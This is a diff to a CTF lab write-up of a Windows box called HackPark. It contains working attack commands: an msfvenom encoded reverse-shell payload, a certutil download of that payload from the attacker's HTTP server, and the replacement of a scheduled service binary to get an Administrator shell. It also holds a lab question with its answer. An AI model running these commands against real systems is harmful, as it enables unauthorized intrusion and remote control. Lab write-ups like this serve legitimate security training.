@@ -288,11 +288,11 @@ Mode                LastWriteTime     Length Name
 ...
 -a---          3/8/2026   1:15 PM      53808 20198415519.INI_LOG.txt
 
-...
-
-- When I inspected the file I see that a binary is executed every 30 seconds by the service WindowsScheduler with Administrator permissions. This binary is located in ``` Directory: C:\Program Files (x86)\SystemScheduler ``` called **Message.exe**. So we create a payload with msfvenom with the same name of the binary on my machine. I rename the binary on the compromised machine as something else except **Message.exe** then upload the payload from my machine to the compromised machine using meterpreter, it will be than be executed causing reverse shell with Administrator privileges.
 
 ```
+
+- When I inspected the file I see that a binary is executed every 30 seconds by the service WindowsScheduler with Administrator permissions. This binary is located in ``` Directory: C:\Program Files (x86)\SystemScheduler ``` called ``` Message.exe ```. So we create a payload with msfvenom with the same name of the binary on my machine. I rename the binary on the compromised machine as something else except ``` Message.exe ``` then upload the payload from my machine to the compromised machine using meterpreter, it will be than be executed causing reverse shell with Administrator privileges.
+
 
 On my machine:
 
@@ -358,26 +358,78 @@ meterpreter > upload Message.exe "C:\Program Files (x86)\SystemScheduler"
 
 We will escalate our privileges without the use of meterpreter/metasploit. We will pivot from our netcat session that we have established, to a more stable reverse shell. Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilites, before using this information to escalate to Administrator.
 
+Generate reverse shell with msfvenom on my attack machine:
 
+```
+❯ msfvenom -p windows/shell_reverse_tcp --encoder x86/shikata_ga_nai LHOST=<my vpn ip address> LPORT=5555 -f exe -o reverse_shell
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse_shell.exe
 
+❯ python -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.112.179.163 - - [08/Mar/2026 23:13:10] "GET /reverse_shell.exe HTTP/1.1" 200 -
+10.112.179.163 - - [08/Mar/2026 23:13:11] "GET /reverse_shell.exe HTTP/1.1" 200 -
+```
 
+Compromised machine:
+```
+whoami
+c:\windows\system32\inetsrv>whoami
+iis apppool\blog
+cd C:/Windows/temp
+c:\windows\system32\inetsrv>cd C:\Windows\temp
+pwd
+C:\Windows\Temp>pwd
+certutil -urlcache -f http://<my vpn ip address>/reverse_shell.exe reverse_shell.exe
+C:\Windows\Temp>certutil -urlcache -f http://<my vpn ip address>:8000/reverse_shell.exe reverse_shell.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+Execute reverse shell payload on compromised machine:
 
+whoami
+C:\Windows\Temp>whoami
+iis apppool\blog
+.\reverse_shell.exe
+C:\Windows\Temp>.\reverse_shell.exe
 
+C:\Windows\Temp>whoami
+iis apppool\blog
+dir
+C:\Windows\Temp>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Directory of C:\Windows\Temp
+03/08/2026  1:17 PM    <DIR>          .
+03/08/2026  1:17 PM    <DIR>          ..
+...
+03/08/2026  12:43 PM             7,168 reverse_shell.exe
+...
+              13 File(s)        642,150 bytes
+               3 Dir(s)  38,979,338,240 bytes free
+```
+- Using the netcat session we got from compromising the machine with exploit, we host python simple server than fetch the payload on the compromised machine with the command ``` certutil -urlcache -f http://<my vpn ip address>:8000/reverse_shell.exe reverse_shell.exe ```, than open another netcat listener for this reverse shell then execute is on the compromised machine, we will get a more stable reverse shell.
 
+- To escalate our privilege to Administrator we traverse to the ``` C:\Program Files (x86)\SystemScheduler\ ``` directory. Rename the ``` Message.exe ``` binary to something else, then on my  machine I create a payload with msfvenom with the same name of the binary on my machine. I upload the payload from my machine to the compromised machine the same way we upload the reverse shell payload, because the WindowsScheduler executes the ``` Message.exe ```, our malicious binary we'll be executed causing reverse shell with Administrator privileges.
 
+```
+C:\Windows\Temp>systeminfo
+systeminfo
 
+Host Name:                 HACKPARK
+OS Name:                   Microsoft Windows Server 2012 R2 Standard
+...
+Original Install Date:     8/3/2019, 10:43:23 AM
+System Boot Time:          3/8/2026, 7:48:04 AM
+...
 
-
-
-
-
-
-
-
-
-
-
-
+```
 
 **Question: Using winPeas, what was the Original Install time? (This is date and time)**
 **Answer: 8/3/2019, 10:43:23 AM**
